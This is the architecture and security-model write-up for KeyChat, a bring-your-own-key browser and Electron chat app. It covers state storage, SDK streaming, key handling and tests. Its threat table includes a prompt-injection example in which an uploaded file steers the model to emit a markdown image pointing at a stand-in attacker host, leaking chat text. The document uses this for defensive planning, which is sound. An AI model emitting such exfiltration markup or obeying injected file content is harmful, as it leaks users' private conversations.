# KeyChat architecture

KeyChat is a static single-page app: React 19 + TypeScript, bundled by Vite. There is no KeyChat
backend. The browser (or the Electron window) talks straight to the model providers with the
user's own API keys, using the official `openai` and `@anthropic-ai/sdk` SDKs. The same `dist/`
build is deployed to GitHub Pages (`.github/workflows/pages.yml`) and loaded from `file://` by
Electron (`electron/main.cjs`). That is why `vite.config.ts` sets `base: './'`.

## 1. Components and state

```
main.tsx          createRoot(...).render(<StrictMode><App/></StrictMode>)
App.tsx           owns all app state and the model call (run / send / editMessage / regenerate)
├─ Sidebar        conversation list grouped by date, search, rename, delete
├─ ModelPicker    models grouped by provider, search when there are more than 8
├─ MessageView    memo'd, one per message: edit + resend, copy, read aloud, regenerate
│  ├─ Markdown    memo'd: react-markdown + remark-gfm + rehype-highlight, code-block copy button
│  └─ FileCard    (from AttachmentViews)
├─ Composer       forwardRef: text, pending attachments, dictation
│  ├─ AttachmentTray / FileCard
│  └─ Waveform    <canvas> level meter, redrawn every requestAnimationFrame
├─ SettingsDialog edits a local draft of Settings; Save fetches the model list, then hands it up
├─ VoiceMode      hands-free loop: listen -> transcribe -> send -> speak -> listen
└─ Lightbox
lib/              plain TypeScript, no React
  providers.ts    SDK clients, listModels, streamChat, transcribe, speak, friendlyError
  attachments.ts  processFile (images, PDFs, text), isImageFile, fileLabel, formatBytes, uid
  storage.ts      localStorage + IndexedDB persistence
  voice.ts        Recorder (mic + level + MediaRecorder + SpeechRecognition), system TTS, plainForSpeech
  types.ts        Provider, Attachment, Message, Conversation, ModelOption, Settings, DEFAULT_SETTINGS
```

The app uses no state library, Context or `useReducer`. `App` is the single owner and passes data
down as props and changes back up as callbacks. Conversation updates are immutable: `putConversation`
replaces one conversation in the list and re-sorts by `updatedAt`. Editing a message re-runs the
model on `messages.slice(0, i)` plus the edited message, so later turns are dropped (like ChatGPT).
Regenerate re-runs from the last user message.

### Where state lives

| Lifetime | Where | What |
|---|---|---|
| Render-to-render (lost on reload) | React `useState` in `App` | `activeId`, `streamingId`, `thinking`, `speakingId`, `modelsLoading`, sidebar/settings/voice/lightbox open flags, `toast`, `dragging`, `atBottom` |
| | React `useState` in children | Composer `text`, `pending` attachments, `dictation` phase; SettingsDialog `draft`; MessageView edit `draft`; Sidebar `query`/`menuFor`/`renaming`; VoiceMode `phase`/`caption` |
| | `useRef` in `App` | `abort` (current `AbortController`), `stopSpeaking` (stop function for read-aloud), `convsRef` (latest conversations for callbacks), `composer` (imperative handle), `stick` (auto-scroll), `dragDepth` |
| Persistent, small | `localStorage` key `keychat.settings` | the whole `Settings` object as JSON: `openaiKey`, `anthropicKey`, `xaiKey`, `openaiBaseUrl`, `anthropicBaseUrl`, `systemPrompt`, `theme`, `voice` |
| | `localStorage` key `keychat.models` | last fetched model list, so the picker fills instantly on boot |
| | `localStorage` key `keychat.lastModel` | id of the last chosen model (`provider:model`) |
| Persistent, large | IndexedDB database `keychat`, store `conversations` (through `idb-keyval`) | one record per `Conversation`, keyed by id, including attachments as `data:` URLs |

`loadSettings` merges stored JSON over `DEFAULT_SETTINGS`, so fields added in later versions get
defaults. Every storage call is wrapped in `try/catch` or `.catch`, so private mode, a full quota or
a blocked IndexedDB never crash the UI. Settings and chats are simply not saved in that case.
While a reply streams, text is pushed into React state only. The conversation is written to
IndexedDB when the turn starts (with an empty reply) and again when it ends, not on every token.

## 2. How streaming works

1. `App.run(conv, history)` adds an empty assistant `Message`, sets `streamingId`, creates an
   `AbortController` (kept in `abort.current`), and calls `streamChat({ settings, model, messages,
   signal, onText, onThinking })` from `lib/providers.ts`.
2. `streamChat` converts the app's `Message[]` to the provider format (`toOpenAI` / `toAnthropic`:
   images as `image_url` or base64 `image` blocks, PDFs as `file` or `document` blocks, text files as
   `<file name="...">` text or `document` blocks) and opens a streaming request:
   - **OpenAI and xAI**: `client.chat.completions.create({ ..., stream: true }, { signal })`, then
     `for await (const chunk of stream)` reading `chunk.choices[0]?.delta?.content`. Grok goes through
     the OpenAI SDK with `baseURL: 'https://api.x.ai/v1'`.
   - **Anthropic**: `client.messages.stream(...)`, then `for await (const event of stream)`.
     `content_block_start` with a `thinking` block calls `onThinking()` once. `content_block_delta`
     with `text_delta` calls `onText`. After the loop, `await stream.finalMessage()` turns
     `stop_reason` `max_tokens` / `refusal` into a notice shown under the reply.
3. Under the hood each SDK calls `fetch`, reads `response.body` (a `ReadableStream` of bytes),
   decodes the Server-Sent Events and yields parsed events through an async iterator. KeyChat does
   not hand-parse SSE. It consumes the SDKs' async iterators. The tests feed raw SSE bytes, cut into
   3- and 5-byte pieces, through a fake `fetch` to show that this whole path works.
4. `onText` appends each delta to a local `buffer` and schedules one `requestAnimationFrame(flush)`.
   `flush` copies the buffer into the reply with an immutable update (`putConversation(current,
   false)`, which does not persist), so React re-renders at most once per frame, however fast
   tokens arrive.
5. When the stream ends, `run` cancels any pending frame, flushes, stores `thoughtFor` plus the error
   or notice on the message, persists the conversation and clears `streamingId`.
6. **Stop** calls `abort.current.abort()`. The OpenAI SDK ends its iterator quietly, and the
   Anthropic SDK throws `APIUserAbortError`. `run` ignores errors when `ctrl.signal.aborted`, keeps
   whatever text arrived, and removes the reply if it is still empty.

Errors go through `friendlyError`. It maps 401, 429, 404 and 5xx to plain sentences and otherwise
shows the provider's error message.

## 3. JavaScript and React patterns that appear in the code

- **Async iteration**: `for await...of` over SDK streams (`streamChat`) and over auto-paginated
  model lists (`listModels`).
- **Parallel async work with per-task fallback**: `listModels` starts one async IIFE per configured
  provider, each with its own `.catch` that falls back to `FALLBACK_MODELS`, then awaits
  `Promise.all(jobs)`. `clearConversations` uses `Promise.all` too.
- **Cancellation with `AbortController`**: chat streaming (`App.run`), read-aloud TTS
  (`App.toggleSpeak`) and voice-mode TTS (`VoiceMode` `say`).
- **Promisifying callback and event APIs**: `readAs` (FileReader), `loadImage` (`Image`
  onload/onerror), `Recorder.stop` (MediaRecorder `onstop`, plus a SpeechRecognition `onend` raced
  against a 700 ms timeout), `VoiceMode` `listen()` and `say()`.
- **Resource cleanup**: `processImage` revokes its object URL in a `finally` block, so it runs even
  when decoding fails. `Recorder.release` (called from `stop` and `cancel`) stops the mic tracks
  and closes the `AudioContext`.
- **Closures as handles**: `speakWithSystemVoice` returns a stop function. `stopSpeaking` and
  `VoiceMode`'s `interrupt` refs hold the current "stop" closure.
- **Refs against stale closures**: `convsRef.current = conversations` on every render, so
  `send`/`editMessage`/`regenerate` read fresh data. `VoiceMode` keeps `utter`, `mutedRef` and an
  `alive` flag in refs so its long-running async loop sees current values and stops on unmount.
- **`forwardRef` + `useImperativeHandle`**: `Composer` exposes `{ addFiles, focus }`. `App` uses it
  for drag-and-drop anywhere on the page and to focus the box on "New chat".
- **requestAnimationFrame loops**: token batching (`App.run`), the `Waveform` canvas, and voice
  activity detection in `VoiceMode` (RMS level from an `AnalyserNode`, thresholds `SPEECH_ON` /
  `SPEECH_OFF`, 1.1 s of silence ends a turn).
- **Memoisation**: `memo` on `MessageView` and `Markdown`, `useMemo` for the selected model and
  sidebar filtering, `useCallback` for handlers passed down.
- **Lazy and functional state updates**: `useState(loadSettings)`, `useState(isWide)`,
  `setPending((p) => ...)`, `setConversations((list) => ...)`.
- **TypeScript**: discriminated string unions (`Provider`, `Attachment['kind']`, `Phase`), a
  generic setter `set<K extends keyof Settings>(k: K, v: Settings[K])` in `SettingsDialog`, generic
  `readLocal<T>`, and a custom error class `AttachmentError`.
- **Effect cleanup**: every `addEventListener` in an effect is removed in its cleanup (menus,
  Escape-to-close, keyboard shortcuts), and every rAF loop is cancelled.

## 4. Security model

### Bring your own key

The user pastes their own provider keys. KeyChat has no account system and no server, and it never
sees the keys. Requests go from the user's device to the provider:

| Key | Sent to | How | Used for |
|---|---|---|---|
| OpenAI | `https://api.openai.com/v1`, or the URL in Settings → OpenAI "API endpoint" | `Authorization: Bearer` | model list, chat, transcription (`gpt-4o-transcribe`, then `whisper-1`), text-to-speech (`gpt-4o-mini-tts`) |
| Anthropic | `https://api.anthropic.com`, or the URL in Settings → Anthropic "API endpoint" | `x-api-key` plus `anthropic-dangerous-direct-browser-access: true` | model list, chat |
| xAI | `https://api.x.ai/v1` (fixed) | `Authorization: Bearer` | model list, chat |

Each key goes only to its own provider's host. `providers.test.ts` checks the URLs and headers
above, and that a provider without a key gets no request. The SDKs need `dangerouslyAllowBrowser:
true` to run in a browser. The flag is the SDKs' warning that the key is visible to client code,
which is exactly the bring-your-own-key trade-off.

**Where keys are stored**: in plain text, inside the `keychat.settings` JSON in `localStorage` for
the page's origin. In the desktop app that is Electron's on-disk profile for the app. Chats,
including attachments, are stored unencrypted in IndexedDB.

### Threat model

| Threat | Impact | Status today |
|---|---|---|
| **XSS in KeyChat's origin** (injected script, malicious model output, compromised npm dependency) | Script can read `localStorage` and send the keys out. Keys are billable credentials. | Model output and user text render through React (escaped). `Markdown` has no `rehype-raw`, so raw HTML is shown as text, and react-markdown's default URL filter empties `javascript:` links (tested in `Markdown.test.tsx`). There is no `dangerouslySetInnerHTML`, `innerHTML` or `eval` in `src/`. Dependencies are bundled from a lockfile with `npm ci`. No CSP yet. |
| **Same-origin neighbours on GitHub Pages** | `https://malek1414.github.io` is one origin for every project site of that account that has no custom domain, so any other Pages site under it can read KeyChat's `localStorage`. | Not mitigated. See hardening item 1. |
| **Malicious browser extensions** with access to the page | Can read the DOM and storage, and so the keys. | Nothing a web page can do. Use the desktop app or a clean browser profile. |
| **Shared or unattended machine** | Keys persist until site data is cleared. Anyone with the profile can read them in DevTools. | Key fields are `type="password"` with `autoComplete="off"` and `spellCheck={false}`. There is no "forget keys" action: Save refuses when all three key fields and the OpenAI endpoint are empty, and "Delete all chats" leaves keys alone. |
| **Prompt injection through an uploaded file** | The model can be steered to output a markdown image such as `![](https://attacker/?q=...)`, which the browser fetches and which leaks chat text. Keys are never part of the prompt. | Remote images in replies are rendered. Not mitigated (see hardening item 2). |
| **Custom endpoint misuse** | A user talked into pasting a hostile endpoint sends that provider's key there. | The field is labelled "Optional" and documented. Social-engineering risk only. |

**Desktop app (Electron) protections in place**: `contextIsolation: true`, `nodeIntegration: false`,
`sandbox: true`. The preload script exposes only `{ platform }` through `contextBridge`.
`window.open` is denied and http(s) links open in the system browser. `will-navigate` blocks leaving
the app. Only the `media` and `clipboard-sanitized-write` permissions are granted.

### Why no proxy?

A proxy would keep the provider key out of the browser, but it would also:

- **Concentrate risk.** It would hold or see every user's key and every conversation. That makes it
  the most valuable target, and it makes the operator a data processor for the chats.
- **Need a server.** GitHub Pages only serves static files, so a proxy means paid hosting,
  operations and uptime for a free tool. It also adds a network hop to every streamed token.
- **Not remove XSS.** The browser would still hold a credential (a session token for the proxy).
  The real gain is that such a token can be scoped, rate-limited and revoked, and a provider key
  cannot.

Both providers support direct browser calls for this use case (Anthropic's
`anthropic-dangerous-direct-browser-access` header, OpenAI's `dangerouslyAllowBrowser`). The
endpoint fields already let a user route through their own gateway that adds the real key on the
server. With an OpenAI endpoint set, KeyChat works without an OpenAI key (it sends `Bearer
no-key`). The Anthropic path still requires some value in the key field.

### Recommended hardening (not implemented)

1. **Own origin.** Serve the web app from its own host, such as a custom domain on its own
   subdomain, so no other site shares its `localStorage`. This is cheap and closes the GitHub Pages
   neighbour problem.
2. **Content Security Policy.** GitHub Pages cannot set response headers, so use a `<meta>` tag
   injected only into the production build. The Vite dev server needs inline scripts and styles for
   hot reload. A starting point (to be verified in a browser before shipping):

   ```
   default-src 'self'; script-src 'self'; style-src 'self';
   img-src 'self' data: blob:; media-src 'self' blob:;
   connect-src 'self' https://api.openai.com https://api.anthropic.com https://api.x.ai;
   object-src 'none'; base-uri 'none'; form-action 'none'
   ```

   It blocks injected inline scripts and `eval`. It also limits where `fetch` and images can send
   data, which covers the prompt-injection image leak. Trade-offs:
   - The `connect-src` allow-list breaks the custom-endpoint feature (OpenRouter, Groq, local
     Ollama) unless those hosts are added or the web build drops the feature.
   - It does not stop a malicious dependency that ships inside the bundle (`'self'`), or
     exfiltration by top-level navigation.
   - `frame-ancestors` cannot be set from a meta tag.
   - The OpenAI SDK probes `fetch('data:,')` before audio uploads. Under this policy that probe logs
     a violation, which the SDK catches.

   Electron should get the same policy, via the meta tag or `session.webRequest.onHeadersReceived`.
3. **Trusted Types** (`require-trusted-types-for 'script'`). The app has no HTML-string sinks of
   its own, so it should cost little, but third-party code needs checking. It is enforced in
   Chromium-based browsers and Electron. Treat it as defence in depth, not a guarantee.
4. **Keys at rest.**
   - Desktop: move keys out of `localStorage` into Electron `safeStorage` (OS keychain, DPAPI or
     libsecret) behind a narrow IPC call. This is a real gain against disk and backup theft.
   - Web: encrypting with a WebCrypto key held in the same origin does not stop XSS, because the
     attacker's script can call decrypt too. It only helps against offline disk reads. A
     passphrase-derived key (PBKDF2 + AES-GCM) unlocked per session helps on shared machines, at
     the cost of typing it.
5. **Session-only keys and a "Forget keys" button** (`sessionStorage` or memory) for shared
   machines.
6. **Block remote images in `Markdown`** with a custom `img` renderer (show a link instead), even
   before a CSP exists.
7. **Advise scoped keys.** Point users to provider project keys with spending limits, so a stolen
   key has a capped blast radius.
8. **Dependency hygiene.** Dependabot or `npm audit` in CI. The lockfile and `npm ci` are already in
   place.

## 5. Testing

Run with `npm test` (Vitest; needs Node 22.12+). `.github/workflows/test.yml` runs `tsc --noEmit`
and the tests on every push and pull request. Test files are in `src/`, so `npm run build`
type-checks them too. Vite does not bundle them, because the app never imports them.

| File | Covers |
|---|---|
| `src/lib/providers.test.ts` | `streamChat` for OpenAI, xAI and Anthropic, driven by raw SSE bytes through a fake `fetch` (also split into 3- and 5-byte chunks): delta order, message and attachment conversion per provider, system prompt handling, `max_tokens` cap, thinking detection and "Thought for Ns", stop-reason notices, Stop / `AbortController` behaviour, missing-key and Grok-PDF guards, base-URL normalisation, which host and header each key goes to. `friendlyError` mapping. `listModels` filtering, sorting, provider ordering, fallbacks, keyless custom endpoint. `transcribe` fallback to `whisper-1`. `speak` request shape. |
| `src/lib/attachments.test.ts` | `isImageFile` (including HEIC by extension), image pass-through vs. resize to 2048 px, WebP vs. JPEG choice, white background, quality step-down and its floor, undecodable images, PDF and text size limits, unsupported types, `fileLabel`, `formatBytes`, `uid`. `Image` and `<canvas>` are faked because jsdom cannot decode or draw. |
| `src/lib/storage.test.ts` | Settings round-trip and default-merging, corrupt JSON, quota and permission errors, model cache, last model. Conversation save, sort, overwrite, delete and clear, with `idb-keyval` replaced by an in-memory map. |
| `src/lib/voice.test.ts` | `Recorder` with fake `getUserMedia` / `AudioContext` / `MediaRecorder` / `SpeechRecognition`: permission errors, codec choice, chunk collection, cleanup, recognition text merging, `cancel`, `level()` maths. `browserRecognition` off in Electron. `speakWithSystemVoice`. `plainForSpeech`. |
| `src/components/Markdown.test.tsx` | Untrusted model output stays inert (raw HTML escaped, `javascript:` links emptied, `rel="noreferrer noopener"`). Code blocks, tables, streaming class. Uses `react-dom/server`, no DOM. |
| `src/test/http.ts` | Helpers: SSE and JSON `Response` builders and a request recorder. |

No test touches the network. Not covered: the orchestration inside `App.tsx` (`run`, `send`,
`editMessage`, `regenerate` are closures inside the component, so testing them needs either an
extraction refactor or a full render test), most component rendering, the `VoiceMode` loop, and
`electron/main.cjs`.
